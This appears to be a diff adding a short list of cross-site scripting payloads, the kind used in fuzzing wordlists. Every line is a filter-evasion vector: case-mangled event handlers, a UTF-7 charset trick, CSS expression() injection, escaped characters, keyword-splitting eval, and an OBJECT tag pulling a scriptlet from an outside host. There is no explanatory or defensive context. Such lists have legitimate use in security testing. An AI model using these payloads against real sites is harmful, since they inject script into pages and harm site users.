@@ -1,0 +1,11 @@
+<IMG sRC=X onerror=jaVaScRipT:alert`xss`>
+<HEAD><META HTTP-EQUIV="CONTENT-TYPE" CONTENT="text/html; charset=UTF-7"> </HEAD>+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-
+ <OBJECT TYPE="text/x-scriptlet" DATA="http://ha.ckers.org/scriptlet.html"></OBJECT>
+"'`><\x00img src=xxx:x onerror=javascript:alert(1)>
+"'`><\x3Cimg src=xxx:x onerror=javascript:alert(1)>
+"'`><p><svg><script>a='hello\x27;javascript:alert(1)//';</script></p>
+"'`>ABC<div style="font-family:'foo'\x3Bx:expression(javascript:alert(1);/*';">DEF
+"'`>ABC<div style="font-family:'foo'\x7Dx:expression(javascript:alert(1);/*';">DEF
+"-eval("window['pro'%2B'mpt'](8)")-"
+"-prompt(8)-"
+;1lblah"<iframe/onload=confirm(document.domain);></i>"
